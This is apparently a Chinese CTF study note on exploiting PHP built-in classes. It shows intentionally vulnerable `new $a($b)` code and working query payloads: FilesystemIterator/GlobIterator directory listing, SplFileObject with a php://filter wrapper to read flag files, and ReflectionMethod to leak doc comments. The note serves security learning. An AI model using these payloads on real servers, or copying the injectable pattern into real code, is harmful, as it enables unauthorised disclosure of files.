# PHP原生类的利用

[TOC]

> 这两天做题的时候，发现有几处原生类的利用，由于之前没有接触过，这次好好学习一下

## 目录读取原生类

### DirectoryIterator类

反正从名字上看是“目录迭代器”

#### 主要题目形式如下：`$a($b);`

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
?>
```

#### 解题思路：

`$a` 传递 `DirectoryIterator`

`$b` 传递 `文件路径`

> 同时主要可以利用`glob://`协议
>
> - `glob:///*` 即可列出根目录下的文件
> - `glob:///*` 即可列出根目录下的文件

#### 例子

```php
<?php
$dir = new DirectoryIterator('E:\untitled1');

foreach ($dir as $fileinfo) {
    if ($fileinfo->isDot()) {
        continue;
    }
    echo "Name: " . $fileinfo->getFilename() . "\n";
    echo "Type: " . ($fileinfo->isDir() ? 'Directory' : 'File') . "\n";
    echo "Size: " . $fileinfo->getSize() . " bytes\n";
    echo "Last Modified: " . date('Y-m-d H:i:s', $fileinfo->getMTime()) . "\n";
    echo "-------------------------\n";
}
?>
```

![image-20240921141616792](https://gitee.com/bx33661/image/raw/master/path/image-20240921141616792.png)



### FilesystemIterator类

> 继承于`Directorylterator`类，用法基本相同
>
> 总的来说：它是 `DirectoryIterator` 的一个更高级的版本。

```php
$iterator = new FilesystemIterator('/path/to/directory');
foreach ($iterator as $fileinfo) {
    echo $fileinfo->getFilename() . "\n";
}
```

#### 例子

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

做法

```
?K=FilesystemIterator&W=/secret/
```

![image-20240921142909738](https://gitee.com/bx33661/image/raw/master/path/image-20240921142909738.png)



### GlobIterator类

> 概述： `GlobIterator` 是 PHP 的 SPL（标准 PHP 库）中的一个类，它继承自 `FilesystemIterator`。这个类使用 glob 模式来选择文件系统中的文件和目录

```php
$iterator = new GlobIterator('/path/to/directory/*.txt');
foreach ($iterator as $fileinfo) {
    echo $fileinfo->getFilename() . "\n";
}
```

#### 例子

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

做法和上两个基本一致：

```
?K=GlobIterator&W=/secret/f*
```

![image-20240921143123902](https://gitee.com/bx33661/image/raw/master/path/image-20240921143123902.png)



## 文件读取原生类

### SplFileInfo类

> SplFileInfo 类提供了一个面向对象的接口来获取文件的信息。它是许多其他 SPL 文件系统类的基础，如 DirectoryIterator 和 FilesystemIterator。

```php
$file = new SplFileInfo('/path/to/file.txt');
echo $file->getFilename(); // 输出: file.txt
```

值得注意的是

SplFileInfo 的局限性： SplFileInfo 主要用于获取文件的元数据（如文件名、大小、权限等），而不是直接读取文件内容。

```php
//例子
<?php
$file = new SplFileInfo('E:\untitled1\flag.php');

echo "File: " . $file->getFilename() . "\n";
echo "Size: " . $file->getSize() . " bytes\n";
echo "Last modified: " . date('Y-m-d H:i:s', $file->getMTime()) . "\n";
echo "Permissions: " . substr(sprintf('%o', $file->getPerms()), -4) . "\n";
echo "Is readable: " . ($file->isReadable() ? 'Yes' : 'No') . "\n";
echo "Is writable: " . ($file->isWritable() ? 'Yes' : 'No') . "\n";
```

![image-20240921144926098](https://gitee.com/bx33661/image/raw/master/path/image-20240921144926098.png)



### SplFileObject类

> 主要用于读取文件的内容

#### 主要题目形式

```php
echo new $a($b);
#echo触发SplFileObject中的__toString()方法
#需要注意一点
#该类不支持通配符，所以必须先获取到完整文件名称才行
```

### 例子

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

做法：

```
J=SplFileObject&H=/secret/f11444g.php
```

> 看了资料获知：除此之外其实`SplFileObject`类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容

采用伪协议：

```
J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php
```



## 获取其他信息类

### ReflectionMethod类

> ReflectionFunctionAbstract类中的getDocComment方法可以访问到注释的内容

语法：

```php
$reflectionMethod = new ReflectionMethod('ClassName', 'methodName');
// 或者
$reflectionMethod = new ReflectionMethod($object, 'methodName');
```

#### 本地测试

```php
<?php
class test
{
    public $a;
    /**
     * 注释内容第一行
     * 注释第二行
     * demo-one
     */

    //你好
    public function getA()
    {
        return $this->a;
    }

    /**
     * 注释内容第一行
     * 注释第二行
     * demo-two
     */
    public function setA($a){
        $this->a = $a;
    }

}
$b = new ReflectionMethod('test','getA');//第一个参数填需要读取注释的类名，第二个参数填类里面的函数名
echo $b->getDocComment();
?>
```

结果为：

```php
/**
     * 注释内容第一行
     * 注释第二行
     * demo-one
     */
```



> 这里我其实并不明白这个怎么找到这个注释，怎么确定这个就是这个方法的注释的
>
> 问了一下Claude
>
> PHP 中的文档注释（DocBlock）并不是由 PHP 解释器直接解析的。相反，它们是由专门的文档生成工具或 IDE 来解析和使用的。这些工具通过一些约定和规则来识别和关联注释与代码元素。以下是一些关键点：
>
> 1. 位置：文档注释通常直接位于它所描述的代码元素（如函数、类、方法等）之前。
>
> 2. 格式：文档注释以 /** 开始，以 */ 结束，每行通常以 * 开头。
>
> 3. 标签：使用特定的标签（如 @param, @return 等）来提供结构化信息。
>
> 4. 关联：工具通过注释的位置和内容来推断它与哪个代码元素相关。
>
> 例如：
>
> ```php
> /**
>  * 获取A的值
>  * 
>  * @return int A的值
>  */
> function getA() {
>     return 42;
> }
> ```
>
> 在这个例子中：
>
> - 文档生成工具或 IDE 会看到这个注释直接位于 `getA()` 函数之前。
> - 注释的格式符合 DocBlock 的标准。
> - 注释的内容描述了函数的行为和返回值。
>
> 基于这些信息，工具可以推断这个注释是描述 `getA()` 函数的。
>
> 重要的是要理解，PHP 本身并不"判断"这个注释属于哪个函数。这个关联是由外部工具（如 PHPDocumentor、IDE 等）根据约定和上下文来确定的。这就是为什么保持良好的注释习惯和遵循标准格式如此重要，因为它能确保这些工具正确理解和使用你的注释。

#### 题目例子

> [2021 CISCN]easy_source
>
> https://r0yanx.com/2020/10/28/fslh-writeup/

```php
<?php
class User
{
    private static $c = 0;

    function a()
    {
        return ++self::$c;
    }

    function b()
    {
        return ++self::$c;
    }

    function c()
    {
        return ++self::$c;
    }

    function d()
    {
        return ++self::$c;
    }

    function e()
    {
        return ++self::$c;
    }

    function f()
    {
        return ++self::$c;
    }

    function g()
    {
        return ++self::$c;
    }

    function h()
    {
        return ++self::$c;
    }

    function i()
    {
        return ++self::$c;
    }

    function j()
    {
        return ++self::$c;
    }

    function k()
    {
        return ++self::$c;
    }

    function l()
    {
        return ++self::$c;
    }

    function m()
    {
        return ++self::$c;
    }

    function n()
    {
        return ++self::$c;
    }

    function o()
    {
        return ++self::$c;
    }

    function p()
    {
        return ++self::$c;
    }

    function q()
    {
        return ++self::$c;
    }

    function r()
    {
        return ++self::$c;
    }

    function s()
    {
        return ++self::$c;
    }

    function t()
    {
        return ++self::$c;
    }
    
}

$rc=$_GET["rc"];    // 传入原生类名
$rb=$_GET["rb"];    // 传入类属性
$ra=$_GET["ra"];    // 传入类属性
$rd=$_GET["rd"];    // 传入类方法
$method= new $rc($ra, $rb);    // 实例化刚才传入的原生类
var_dump($method->$rd());     // 调用类中的方法
```

做法：

```
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```





## 其他

### PHP所有原生类

#### 列出所有原生类

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            'open',
            '__set_state'    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}

```

#### 所有原生类名称

输出结果如下：

```php
Exception::__wakeup
Exception::__toString
ErrorException::__wakeup
ErrorException::__toString
Error::__wakeup
Error::__toString
CompileError::__wakeup
CompileError::__toString
ParseError::__wakeup
ParseError::__toString
TypeError::__wakeup
TypeError::__toString
ArgumentCountError::__wakeup
ArgumentCountError::__toString
ValueError::__wakeup
ValueError::__toString
ArithmeticError::__wakeup
ArithmeticError::__toString
DivisionByZeroError::__wakeup
DivisionByZeroError::__toString
UnhandledMatchError::__wakeup
UnhandledMatchError::__toString
ClosedGeneratorException::__wakeup
ClosedGeneratorException::__toString
FiberError::__wakeup
FiberError::__toString
DateTime::__wakeup
DateTime::__set_state
DateTimeImmutable::__wakeup
DateTimeImmutable::__set_state
DateTimeZone::__wakeup
DateTimeZone::__set_state
DateInterval::__wakeup
DateInterval::__set_state
DatePeriod::__wakeup
DatePeriod::__set_state
JsonException::__wakeup
JsonException::__toString
LogicException::__wakeup
LogicException::__toString
BadFunctionCallException::__wakeup
BadFunctionCallException::__toString
BadMethodCallException::__wakeup
BadMethodCallException::__toString
DomainException::__wakeup
DomainException::__toString
InvalidArgumentException::__wakeup
InvalidArgumentException::__toString
LengthException::__wakeup
LengthException::__toString
OutOfRangeException::__wakeup
OutOfRangeException::__toString
RuntimeException::__wakeup
RuntimeException::__toString
OutOfBoundsException::__wakeup
OutOfBoundsException::__toString
OverflowException::__wakeup
OverflowException::__toString
RangeException::__wakeup
RangeException::__toString
UnderflowException::__wakeup
UnderflowException::__toString
UnexpectedValueException::__wakeup
UnexpectedValueException::__toString
CachingIterator::__toString
RecursiveCachingIterator::__toString
SplFileInfo::__toString
DirectoryIterator::__toString
FilesystemIterator::__toString
RecursiveDirectoryIterator::__toString
GlobIterator::__toString
SplFileObject::__toString
SplTempFileObject::__toString
SplFixedArray::__wakeup
Random\RandomError::__wakeup
Random\RandomError::__toString
Random\BrokenRandomEngineError::__wakeup
Random\BrokenRandomEngineError::__toString
Random\RandomException::__wakeup
Random\RandomException::__toString
ReflectionException::__wakeup
ReflectionException::__toString
ReflectionFunctionAbstract::__toString
ReflectionFunction::__toString
ReflectionParameter::__toString
ReflectionType::__toString
ReflectionNamedType::__toString
ReflectionUnionType::__toString
ReflectionIntersectionType::__toString
ReflectionMethod::__toString
ReflectionClass::__toString
ReflectionObject::__toString
ReflectionProperty::__toString
ReflectionClassConstant::__toString
ReflectionExtension::__toString
ReflectionZendExtension::__toString
ReflectionAttribute::__toString
ReflectionEnum::__toString
ReflectionEnumUnitCase::__toString
ReflectionEnumBackedCase::__toString
SessionHandler::open
AssertionError::__wakeup
AssertionError::__toString
PhpToken::__toString
DOMException::__wakeup
DOMException::__toString
PDOException::__wakeup
PDOException::__toString
PharException::__wakeup
PharException::__toString
Phar::__destruct
Phar::__toString
PharData::__destruct
PharData::__toString
PharFileInfo::__destruct
PharFileInfo::__toString
SimpleXMLElement::__toString
SimpleXMLIterator::__toString
XMLReader::open
```

